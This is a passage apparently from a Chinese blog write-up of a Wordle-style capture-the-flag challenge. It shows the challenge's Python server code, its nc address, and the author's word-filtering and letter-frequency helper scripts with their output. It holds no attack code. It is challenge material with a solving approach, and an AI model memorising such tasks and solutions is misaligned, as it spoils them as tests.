class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> award</span><br><span class="line"></span><br><span class="line">random.seed(os.urandom(<span class="number">64</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;allowed_guesses.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    allowed_guesses = <span class="built_in">set</span>([x.strip() <span class="keyword">for</span> x <span class="keyword">in</span> f.readlines()])</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;valid_words.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    valid_words = [x.strip() <span class="keyword">for</span> x <span class="keyword">in</span> f.readlines()]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MAX_LEVEL = <span class="number">512</span></span><br><span class="line">GREEN = <span class="string">&#x27;\033[42m  \033[0m&#x27;</span></span><br><span class="line">YELLOW = <span class="string">&#x27;\033[43m  \033[0m&#x27;</span></span><br><span class="line">WHITE = <span class="string">&#x27;\033[47m  \033[0m&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_challenge</span>():</span></span><br><span class="line">    <span class="comment"># id = random.getrandbits(32)</span></span><br><span class="line">    <span class="comment"># answer = valid_words[id % len(valid_words)]</span></span><br><span class="line">    <span class="comment"># return hex(id)[2:].zfill(8), answer</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># To prevent the disclosure of answer</span></span><br><span class="line">    <span class="built_in">id</span> = random.randrange(<span class="built_in">len</span>(valid_words) * (<span class="number">2</span> ** <span class="number">20</span>))</span><br><span class="line">    answer = valid_words[<span class="built_in">id</span> % <span class="built_in">len</span>(valid_words)]</span><br><span class="line">    <span class="built_in">id</span> = (<span class="built_in">id</span> // <span class="built_in">len</span>(valid_words)) ^ (<span class="built_in">id</span> % <span class="built_in">len</span>(valid_words))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(<span class="built_in">id</span>)[<span class="number">2</span>:].zfill(<span class="number">5</span>), answer</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">answer, guess</span>):</span></span><br><span class="line">    answer_chars = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">if</span> guess[i] != answer[i]:</span><br><span class="line">            answer_chars.append(answer[i])</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">if</span> guess[i] == answer[i]:</span><br><span class="line">            result.append(GREEN)</span><br><span class="line">        <span class="keyword">elif</span> guess[i] <span class="keyword">in</span> answer_chars:</span><br><span class="line">            result.append(YELLOW)</span><br><span class="line">            answer_chars.remove(guess[i])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append(WHITE)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>.join(result)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">game</span>(<span class="params">limit</span>):</span></span><br><span class="line">    <span class="built_in">round</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">round</span> &lt; MAX_LEVEL:</span><br><span class="line">        <span class="built_in">round</span> += <span class="number">1</span></span><br><span class="line">        <span class="built_in">id</span>, answer = get_challenge()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Round <span class="subst">&#123;<span class="built_in">round</span>&#125;</span>: #<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span>)</span><br><span class="line">        correct = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(limit):</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                guess = <span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(guess) == <span class="number">5</span> <span class="keyword">and</span> guess <span class="keyword">in</span> allowed_guesses:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;Invalid guess&#x27;</span>)</span><br><span class="line">            result = check(answer, guess)</span><br><span class="line">            <span class="keyword">if</span> result == <span class="string">&#x27; &#x27;</span>.join([GREEN] * <span class="number">5</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;Correct! <span class="subst">&#123;result&#125;</span>&#x27;</span>)</span><br><span class="line">                correct = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;Wrong!   <span class="subst">&#123;result&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> correct:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;You failed...&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">round</span> - <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> MAX_LEVEL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose_mode</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Choose gamemode:&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;0: Easy mode&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;1: Normal mode&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;2: Hard mode&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;3: Insane mode&#x27;</span>)</span><br><span class="line">    <span class="comment"># print(&#x27;4: Expert mode&#x27;)</span></span><br><span class="line">    <span class="comment"># print(&#x27;-1: Osu! mode&#x27;)</span></span><br><span class="line">    mode = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>))</span><br><span class="line">    <span class="keyword">assert</span> <span class="number">0</span> &lt;= mode &lt;= <span class="number">3</span></span><br><span class="line">    <span class="keyword">return</span> mode</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Guess the WORDLE in a few tries.&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Each guess must be a valid 5 letter word.&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;After each guess, the color of the tiles will change to show how close your guess was to the word.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        mode = choose_mode()</span><br><span class="line">        <span class="keyword">if</span> mode == <span class="number">0</span>:</span><br><span class="line">            limit = <span class="number">999999999</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            limit = <span class="number">7</span> - mode</span><br><span class="line">        final_level = game(limit)</span><br><span class="line">        <span class="keyword">if</span> final_level &lt; MAX_LEVEL:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;You are the Master of WORDLE!&#x27;</span>)</span><br><span class="line">        flag = award(mode, final_level)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Here is you award: <span class="subst">&#123;flag&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure></li><li><p><strong>valid_words.txt</strong></p><p>有效的单词，即：谜底单词在这里面（没错，允许猜的有很多不可能是答案</p></li></ul><h3 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h3><p><code>nc 47.106.102.129 21480</code></p><p>靶机挂了，需要意会。</p><h3 id="查找的脚本"><a href="#查找的脚本" class="headerlink" title="查找的脚本"></a>查找的脚本</h3><p>跟服务器交互，本能的写出了，如下朴素的人工辅助脚本。</p><p>具体实现为：</p><ul><li>输入一个字母，在<strong>valid_words.txt</strong>中剔除没有这个字母的单词</li><li>输入一个字母，删除含有这个字母的单词</li><li>制定某个字母的位置，剔除在指定位置没有该字母的单词</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="built_in">open</span>(<span class="string">&#x27;./valid_words.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">data = data.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">tmp = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> tmp != <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">    tmp = <span class="built_in">input</span>(<span class="string">&quot;请输入搜索的单词:&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> tmp == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;程序已关闭&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;-&#x27;</span> <span class="keyword">in</span> tmp:  <span class="comment"># -o</span></span><br><span class="line">        del_word = tmp.split(<span class="string">&#x27;-&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">        <span class="comment"># print(del_word, len(del_word))</span></span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        data2 = []</span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">if</span> del_word <span class="keyword">in</span> word:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                data2.append(word)</span><br><span class="line">        data = data2</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;共有&#123;0&#125;个&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(data)))</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;[&#x27;</span> <span class="keyword">in</span> tmp:  <span class="comment"># d[1]</span></span><br><span class="line">        tmp = tmp.split(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">        word = tmp[<span class="number">0</span>]  <span class="comment"># d</span></span><br><span class="line">        <span class="built_in">print</span>(word)</span><br><span class="line">        <span class="built_in">print</span>(tmp)</span><br><span class="line">        site = tmp[<span class="number">1</span>][<span class="number">0</span>]  <span class="comment"># 1</span></span><br><span class="line">        data2 = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">if</span> i[<span class="built_in">int</span>(site) - <span class="number">1</span>] == word:</span><br><span class="line">                data2.append(i)</span><br><span class="line">        data = data2</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;共有&#123;0&#125;个&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(data)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line">            data = <span class="built_in">open</span>(<span class="string">&#x27;./valid_words.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">            data = data.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        data1 = data</span><br><span class="line">        data = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> data1:</span><br><span class="line">            <span class="keyword">if</span> tmp <span class="keyword">in</span> i:</span><br><span class="line">                data.append(i)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;共有&#123;0&#125;个&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(data)))</span><br></pre></td></tr></table></figure><h3 id="统计"><a href="#统计" class="headerlink" title="统计"></a>统计</h3><p>后来仔细思考，想知道什么单词开头能最有效率，于是想到了统计制定位字母出现的频率</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="built_in">open</span>(<span class="string">&#x27;./valid_words.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">data = data.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">tmp = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> tmp != <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">    tmp = <span class="built_in">input</span>(<span class="string">&quot;请输入搜索的单词:&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> tmp == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;程序已关闭&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;-&#x27;</span> <span class="keyword">in</span> tmp:  <span class="comment"># -o[3]</span></span><br><span class="line">        tmp = <span class="string">&#x27;&#x27;</span>.join(tmp.split(<span class="string">&#x27;-&#x27;</span>)).split(<span class="string">&quot;[&quot;</span>)</span><br><span class="line">        <span class="comment"># [&#x27;o&#x27;, &#x27;3]&#x27;]</span></span><br><span class="line">        del_word = tmp[<span class="number">0</span>]</span><br><span class="line">        site = <span class="built_in">int</span>(tmp[<span class="number">1</span>][<span class="number">0</span>])</span><br><span class="line">        <span class="comment"># print(del_word, len(del_word))</span></span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        data2 = []</span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">if</span> word[site-<span class="number">1</span>] != del_word:</span><br><span class="line">                data2.append(word)</span><br><span class="line">        data = data2</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;共有&#123;0&#125;个&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(data)))</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;[&#x27;</span> <span class="keyword">in</span> tmp:  <span class="comment"># d[1]</span></span><br><span class="line">        tmp = tmp.split(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">        word = tmp[<span class="number">0</span>]  <span class="comment"># d</span></span><br><span class="line">        <span class="built_in">print</span>(word)</span><br><span class="line">        <span class="built_in">print</span>(tmp)</span><br><span class="line">        site = tmp[<span class="number">1</span>][<span class="number">0</span>]  <span class="comment"># 1</span></span><br><span class="line">        data2 = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">if</span> i[<span class="built_in">int</span>(site) - <span class="number">1</span>] == word:</span><br><span class="line">                data2.append(i)</span><br><span class="line">        data = data2</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;共有&#123;0&#125;个&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(data)))</span><br><span class="line">    <span class="keyword">elif</span> tmp.isdigit():</span><br><span class="line">        <span class="comment"># 1 -&gt; 统计所有单词第一位的数据</span></span><br><span class="line">        site = <span class="built_in">int</span>(tmp)</span><br><span class="line">        dict_letter = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">if</span> word[site -<span class="number">1</span>] <span class="keyword">in</span> dict_letter:</span><br><span class="line">                dict_letter[word[site -<span class="number">1</span>]] += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dict_letter[word[site -<span class="number">1</span>]] = <span class="number">1</span></span><br><span class="line">        dict_letter.items()  <span class="comment"># 得到: dict_items([(&#x27;a&#x27;, 1), (&#x27;c&#x27;, 3), (&#x27;b&#x27;, 2)])</span></span><br><span class="line"></span><br><span class="line">        L = <span class="built_in">list</span>(dict_letter.items())  <span class="comment"># 得到列表: L=[(&#x27;a&#x27;, 1), (&#x27;c&#x27;, 3), (&#x27;b&#x27;, 2)]</span></span><br><span class="line">        L.sort(key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>], reverse=<span class="literal">False</span>)  <span class="comment"># 按列表中，每一个元组的第二个元素从小到大排序。</span></span><br><span class="line">        <span class="comment"># x代表从L中遍历出的一个元组</span></span><br><span class="line">        <span class="comment"># 得到:  [(&#x27;a&#x27;, 1), (&#x27;b&#x27;, 2), (&#x27;c&#x27;, 3)]</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> L:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;字母&#123;0&#125;         &#123;1&#125;次&quot;</span>.<span class="built_in">format</span>(i[<span class="number">0</span>], i[<span class="number">1</span>]))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;已统计第 &#123;0&#125; 位字母的数据&quot;</span>.<span class="built_in">format</span>(site))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 存在 s</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line">            data = <span class="built_in">open</span>(<span class="string">&#x27;./valid_words.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">            data = data.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        data1 = data</span><br><span class="line">        data = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> data1:</span><br><span class="line">            <span class="keyword">if</span> tmp <span class="keyword">in</span> i:</span><br><span class="line">                data.append(i)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;共有&#123;0&#125;个&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(data)))</span><br></pre></td></tr></table></figure><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line">请输入搜索的单词:<span class="selector-tag">1</span></span><br><span class="line">字母<span class="selector-tag">z</span>         <span class="selector-tag">4</span>次</span><br><span class="line">字母<span class="selector-tag">y</span>         <span class="selector-tag">18</span>次</span><br><span class="line">字母<span class="selector-tag">q</span>         <span class="selector-tag">32</span>次</span><br><span class="line">字母<span class="selector-tag">j</span>         <span class="selector-tag">38</span>次</span><br><span class="line">字母<span class="selector-tag">u</span>         <span class="selector-tag">42</span>次</span><br><span class="line">字母<span class="selector-tag">k</span>         <span class="selector-tag">45</span>次</span><br><span class="line">字母<span class="selector-tag">i</span>         <span class="selector-tag">48</span>次</span><br><span class="line">字母<span class="selector-tag">n</span>         <span class="selector-tag">67</span>次</span><br><span class="line">字母<span class="selector-tag">o</span>         <span class="selector-tag">67</span>次</span><br><span class="line">字母<span class="selector-tag">v</span>         <span class="selector-tag">89</span>次</span><br><span class="line">字母<span class="selector-tag">e</span>         <span class="selector-tag">94</span>次</span><br><span class="line">字母<span class="selector-tag">h</span>         <span class="selector-tag">144</span>次</span><br><span class="line">字母<span class="selector-tag">w</span>         <span class="selector-tag">159</span>次</span><br><span class="line">字母<span class="selector-tag">l</span>         <span class="selector-tag">184</span>次</span><br><span class="line">字母<span class="selector-tag">r</span>         <span class="selector-tag">198</span>次</span><br><span class="line">字母<span class="selector-tag">g</span>         <span class="selector-tag">199</span>次</span><br><span class="line">字母<span class="selector-tag">m</span>         <span class="selector-tag">212</span>次</span><br><span class="line">字母<span class="selector-tag">d</span>         <span class="selector-tag">219</span>次</span><br><span class="line">字母<span class="selector-tag">a</span>         <span class="selector-tag">221</span>次</span><br><span class="line">字母<span class="selector-tag">f</span>         <span class="selector-tag">252</span>次</span><br><span class="line">字母<span class="selector-tag">t</span>         <span class="selector-tag">260</span>次</span><br><span class="line">字母<span class="selector-tag">p</span>         <span class="selector-tag">280</span>次</span><br><span class="line">字母<span class="selector-tag">b</span>         <span class="selector-tag">318</span>次</span><br><span class="line">字母<span class="selector-tag">c</span>         <span class="selector-tag">337</span>次</span><br><span class="line">字母<span class="selector-tag">s</span>         <span class="selector-tag">563</span>次</span><br><span class="line">已统计第 <span class="selector-tag">1</span> 位字母的数据</span><br><span class="line">请输入搜索的单词:<span class="selector-tag">2</span></span><br><span class="line">字母<span class="selector-tag">j</span>         <span class="selector-tag">2</span>次</span><br><span class="line">字母<span class="selector-tag">z</span>         <span class="selector-tag">2</span>次</span><br><span class="line">字母<span class="selector-tag">q</span>         <span class="selector-tag">6</span>次</span><br><span class="line">字母<span class="selector-tag">f</span>         <span class="selector-tag">9</span>次</span><br><span class="line">字母<span class="selector-tag">g</span>         <span class="selector-tag">14</span>次</span><br><span class="line">字母<span class="selector-tag">x</span>         <span class="selector-tag">16</span>次</span><br><span class="line">字母<span class="selector-tag">k</span>         <span class="selector-tag">17</span>次</span><br><span class="line">字母<span class="selector-tag">v</span>         <span class="selector-tag">23</span>次</span><br><span class="line">字母<span class="selector-tag">b</span>         <span class="selector-tag">23</span>次</span><br><span class="line">字母<span class="selector-tag">s</span>         <span class="selector-tag">31</span>次</span><br><span class="line">字母<span class="selector-tag">y</span>         <span class="selector-tag">32</span>次</span><br><span class="line">字母<span class="selector-tag">d</span>         <span class="selector-tag">33</span>次</span><br><span class="line">字母<span class="selector-tag">m</span>         <span class="selector-tag">49</span>次</span><br><span class="line">字母<span class="selector-tag">c</span>         <span class="selector-tag">54</span>次</span><br><span class="line">字母<span class="selector-tag">w</span>         <span class="selector-tag">56</span>次</span><br><span class="line">字母<span class="selector-tag">p</span>         <span class="selector-tag">80</span>次</span><br><span class="line">字母<span class="selector-tag">t</span>         <span class="selector-tag">107</span>次</span><br><span class="line">字母<span class="selector-tag">n</span>         <span class="selector-tag">120</span>次</span><br><span class="line">字母<span class="selector-tag">h</span>         <span class="selector-tag">195</span>次</span><br><span class="line">字母<span class="selector-tag">l</span>         <span class="selector-tag">290</span>次</span><br><span class="line">字母<span class="selector-tag">u</span>         <span class="selector-tag">316</span>次</span><br><span class="line">字母<span class="selector-tag">r</span>         <span class="selector-tag">377</span>次</span><br><span class="line">字母<span class="selector-tag">i</span>         <span class="selector-tag">441</span>次</span><br><span class="line">字母<span class="selector-tag">e</span>         <span class="selector-tag">493</span>次</span><br><span class="line">字母<span class="selector-tag">o</span>         <span class="selector-tag">615</span>次</span><br><span class="line">字母<span class="selector-tag">a</span>         <span class="selector-tag">689</span>次</span><br><span class="line">已统计第 <span class="selector-tag">2</span> 